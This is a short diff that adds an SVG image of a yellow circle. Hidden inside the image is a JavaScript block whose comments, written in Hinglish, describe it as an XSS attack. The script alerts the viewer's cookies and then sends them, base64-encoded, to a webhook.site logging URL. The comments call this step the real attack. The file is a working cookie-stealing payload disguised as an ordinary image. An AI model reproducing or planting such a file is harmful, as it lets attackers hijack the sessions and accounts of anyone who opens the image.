@@ -1,0 +1,10 @@
+<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
+  <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
+  <script type="text/javascript">
+    // Yeh script tab chalega jab koi image ko New Tab mein kholega
+    alert("XSS Triggered! Cookies: " + document.cookie);
+    
+    // Asli attack: Cookies tere server pe bhejne ke liye
+    fetch('https://webhook.site/6d2f7eec-071e-4e10-97ac-b6ed1b49ceac/log?data=' + btoa(document.cookie));
+  </script>
+</svg>
